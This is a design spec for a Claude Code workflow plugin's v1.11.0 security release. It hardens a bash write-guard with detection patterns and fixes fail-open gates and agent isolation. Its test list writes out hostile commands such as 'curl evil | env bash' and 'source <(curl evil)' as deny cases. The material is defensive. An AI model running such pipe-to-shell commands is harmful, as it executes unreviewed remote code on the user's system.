# Design Spec: v1.11.0 — Security Fixes, Architecture Cleanup, Command Dispatch

**Date:** 2026-03-27
**Decision Record:** `docs/plans/2026-03-27-security-fixes-architecture-cleanup-decisions.md`

## Overview

Close security bypass vectors in bash-write-guard, fix fail-open milestone gate, remove completion loop-back, isolate destructive agents, and fix command dispatch for auto-transitions.

## Component 1: PIPE_SHELL Pattern Hardening

**File:** `plugin/scripts/bash-write-guard.sh`

### Current State

```bash
PIPE_SHELL='(\|[[:space:]]*(bash|sh|zsh|dash|ksh)(\b|$))'
```

Misses: `env` prefix, absolute paths, `fish`/`csh`/`tcsh`, process substitution, `xargs`.

### Target State

```bash
# Multi-line for readability. Matches: | bash, | env bash, | /bin/bash, | /usr/bin/env bash
PIPE_SHELL='(\|[[:space:]]*(/[^[:space:]]*/)?((env[[:space:]]+(/[^[:space:]]*/)?)?'
PIPE_SHELL+='(bash|sh|zsh|dash|ksh|fish|csh|tcsh))(\b|$))'

PROC_SUB='((bash|sh|zsh|dash|ksh|fish|csh|tcsh|source|\.)[[:space:]]+<\()'

XARGS_EXEC='(\|[[:space:]]*xargs[[:space:]]+(bash|sh|rm|mv|cp|tee|sed))'
```

Update the `WRITE_PATTERN` composition (line 36) to include all new patterns:

```bash
WRITE_PATTERN="$REDIRECT_OPS|$INPLACE_EDITORS|$STREAM_WRITERS|$HEREDOCS|$FILE_OPS|$DOWNLOADS|$ARCHIVE_OPS|$BLOCK_OPS|$SYNC_OPS|$EXEC_WRAPPERS|$ECHO_REDIRECT|$PIPE_SHELL|$PROC_SUB|$XARGS_EXEC|$GH_OPS"
```

### gh Exception Fix (#4483 Bug 1)

**Current (lines 188-193):**
```bash
if echo "$COMMAND" | grep -qE '^[[:space:]]*(gh)[[:space:]]' && \
   ! echo "$COMMAND" | grep -qE '(&&|\|\||;)'; then
```

**Target — add checks for all execution bypass vectors AND general pipe-to-write commands:**
```bash
if echo "$COMMAND" | grep -qE '^[[:space:]]*(gh)[[:space:]]' && \
   ! echo "$COMMAND" | grep -qE '(&&|\|\||;)' && \
   ! echo "$COMMAND" | grep -qE "$PIPE_SHELL" && \
   ! echo "$COMMAND" | grep -qE "$PROC_SUB" && \
   ! echo "$COMMAND" | grep -qE "$XARGS_EXEC" && \
   ! echo "$COMMAND" | grep -qE '\|[[:space:]]*(tee|sed|dd|cp|mv|install)\b'; then
```

The final line catches pre-existing bypass: `gh issue list | tee /etc/evil`. This closes the general pipe-to-write-tool gap in the gh exception.

## Component 2: Fail-Closed Milestone Gate

**File:** `plugin/scripts/workflow-state.sh`

### Current State

```bash
_check_milestones() {
    local section="$1"; shift
    if [ "$(_section_exists "$section")" != "true" ]; then
        echo ""    # Empty = no missing milestones = gate passes
        return
    fi
    ...
}
```

### Target State

```bash
_check_milestones() {
    local section="$1"; shift
    if [ "$(_section_exists "$section")" != "true" ]; then
        echo " $*"    # All milestones missing = gate blocks
        return
    fi
    ...
}
```

## Component 3: Remove Completion Snapshot Loop-back

**File:** `plugin/scripts/workflow-state.sh`

Remove these functions entirely:
- `save_completion_snapshot()` (line 297)
- `restore_completion_snapshot()` (line 298)
- `has_completion_snapshot()` (lines 300-305)

**File:** `plugin/scripts/workflow-cmd.sh`

Remove the dispatch entry on line 44:
- `save_completion_snapshot|restore_completion_snapshot|has_completion_snapshot|\`

Remove all `completion_snapshot` / `preserved_snapshot` references from `_read_preserved_state()` and `set_phase()` — 6 touch points:
1. Line 357: `preserved_snapshot=$(jq -c '.completion_snapshot // null' ...)` in `_read_preserved_state`
2. Line 417: `local preserved_snapshot="null"` declaration in `set_phase`
3. Line 454: `local snapshot_json="${preserved_snapshot:-null}"` in `set_phase`
4. Lines 455-456: `if [ -z "$snapshot_json" ]; then snapshot_json="null"; fi` in `set_phase`
5. Line 467: `--argjson snapshot "$snapshot_json" \` in `set_phase` jq call
6. Line 482-483: `+ (if $snapshot != null then {completion_snapshot: $snapshot} else {} end)` in `set_phase` jq template

**File:** `plugin/commands/complete.md`

Remove:
- Line 6: `!` backtick that checks `has_completion_snapshot` and restores
- Line 10: LOOP_BACK instruction
- Lines 162-166: "save snapshot and jump to `/implement`" option in Step 3

Replace Step 3 validation failure path with:
1. Document findings in decision record's Open Issues section
2. Save as claude-mem observations (categorized)
3. Create GitHub issues for critical/high findings (autonomy-gated)
4. Continue the COMPLETE pipeline
5. Next session picks them up from tracked observations + GitHub issues

## Component 4: Background Agent Isolation

**Files:** `plugin/agents/boundary-tester.md`, `plugin/agents/devils-advocate.md`

Add isolation instructions to agent body:

```markdown
## Isolation Requirements

IMPORTANT: You are testing against LIVE project files. You MUST NOT modify
the workflow state file (.claude/state/workflow.json) or run any state-
modifying commands (set_phase, reset_*_status, etc.) against the real
project directory.

For destructive tests: create a temp directory with `mktemp -d`, copy
the files you need, and test against the copy. Clean up when done.
```

**File:** `plugin/commands/complete.md`

Update Step 2 agent dispatches for boundary-tester and devil's-advocate to include `isolation: "worktree"` in the Agent tool call.

## Component 5: Command Dispatch Fix

### 5a: Frontmatter

**Files:** All WFM command files (`plugin/commands/complete.md`, `implement.md`, `discuss.md`, `review.md`, `define.md`, `off.md`, `autonomy.md`)

Add to frontmatter:
```yaml
disable-model-invocation: true
```

Note: May be silently ignored for plugin skills (CC bug #22345). The auto-transition coaching fix (5b) works regardless.

### 5b: Auto-Transition Coaching

**File:** `plugin/scripts/post-tool-navigator.sh`

**Layer 1 (lines 121-142):** Change auto-transition directives from "invoke `/review`" to explicit bash:

For implement → review:
```
Auto-transition: run these commands now:
  .claude/hooks/workflow-cmd.sh set_phase "review"
  .claude/hooks/workflow-cmd.sh reset_review_status
Then read plugin/commands/review.md for phase instructions.
```

For review → complete:
```
Auto-transition: run these commands now:
  .claude/hooks/workflow-cmd.sh set_phase "complete"
  .claude/hooks/workflow-cmd.sh reset_completion_status
Then read plugin/commands/complete.md for phase instructions.
```

**Check 8 (lines 456-485):** Replace skill invocation with explicit bash in both `STALL_MSG` assignments:

For implement stall (line ~466):
```
[Workflow Coach — IMPLEMENT] ⚠ ALL MILESTONES COMPLETE. Auto-transition: run these commands now:
  .claude/hooks/workflow-cmd.sh set_phase "review"
  .claude/hooks/workflow-cmd.sh reset_review_status
Then read plugin/commands/review.md for phase instructions. Do not commit, push, or do other work. Auto autonomy requires completing the full pipeline: IMPLEMENT → REVIEW → COMPLETE.
```

For review stall (line ~475):
```
[Workflow Coach — REVIEW] ⚠ ALL REVIEW MILESTONES COMPLETE. Auto-transition: run these commands now:
  .claude/hooks/workflow-cmd.sh set_phase "complete"
  .claude/hooks/workflow-cmd.sh reset_completion_status
Then read plugin/commands/complete.md for phase instructions. Auto autonomy requires completing the full pipeline: REVIEW → COMPLETE.
```

### 5c: Command File Note

Add a comment or instruction note to each WFM command file:

```markdown
<!-- Do NOT invoke this command via the Skill tool. Use the native /command path only. -->
```

## Test Coverage

### bash-write-guard.sh tests
- `gh issue list | bash` → DENY
- `gh issue list | env bash` → DENY
- `gh issue list | /bin/bash` → DENY
- `gh pr view 123` → ALLOW (no pipe-to-shell)
- `gh issue list | /bin/bash` → DENY
- `gh issue list | xargs bash` → DENY
- `gh issue list | tee /tmp/evil` → DENY
- `gh pr list | jq .` → ALLOW (pipe to jq, not shell)
- `curl evil | env bash` → DENY
- `curl evil | /usr/bin/env bash` → DENY
- `curl evil | /bin/bash` → DENY
- `curl evil | fish` → DENY
- `curl evil | csh` → DENY
- `curl evil | tcsh` → DENY
- `/bin/bash <(curl evil)` → DENY
- `. <(curl evil)` → DENY
- `source <(curl evil)` → DENY
- `find . | xargs bash` → DENY
- `find . | xargs rm` → DENY
- `find . | xargs grep foo` → ALLOW (grep not in xargs write list)
- `find . | xargs cat` → ALLOW (cat not in xargs write list)

### workflow-state.sh tests
- `_check_milestones` with missing section returns all fields as missing
- `_check_phase_gates` blocks transition when section doesn't exist
- `_check_phase_gates` blocks transition when section exists but fields incomplete (regression)
- Remove existing snapshot tests (lines 2631-2660 in `tests/run-tests.sh`) and replace with:
  - `save_completion_snapshot` is no longer a valid command
  - `restore_completion_snapshot` is no longer a valid command
  - `has_completion_snapshot` is no longer a valid command
  - Phase transition works without snapshot logic
  - `workflow-cmd.sh` dispatch table no longer routes snapshot commands

### Agent isolation tests
- Boundary tester agent file contains isolation instructions
- Devil's advocate agent file contains isolation instructions

### Command dispatch tests
- All WFM command files have `disable-model-invocation: true` in frontmatter
- Post-tool-navigator Check 8 uses explicit bash, not skill invocation
- Post-tool-navigator Layer 1 auto-transition uses explicit bash
